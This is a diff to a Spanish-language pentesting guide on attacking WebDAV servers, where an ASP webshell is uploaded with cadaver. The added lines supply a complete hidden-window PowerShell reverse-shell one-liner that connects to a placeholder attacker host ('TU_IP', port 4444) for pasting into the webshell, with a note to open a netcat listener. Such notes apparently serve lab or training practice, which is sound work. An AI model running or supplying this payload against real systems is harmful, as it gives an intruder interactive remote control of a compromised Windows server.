@@ -136,6 +136,11 @@ put /usr/share/webshells/asp/webshell.asp
 Después entramos al navegador de donde esta WebDav y ya podemos ejecutar comandos entrando con las credenciales claro.
 ---
 
+Si quieres tener sesion nc mete en la webshell:
+````
+powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('TU_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+````
+`y abre el netcat escuchando 
 ## 6. Pasos para descargar archivos con davtest, cadaver y herramientas complementarias
 
 1. Ejecuta `davtest` para identificar métodos habilitados.
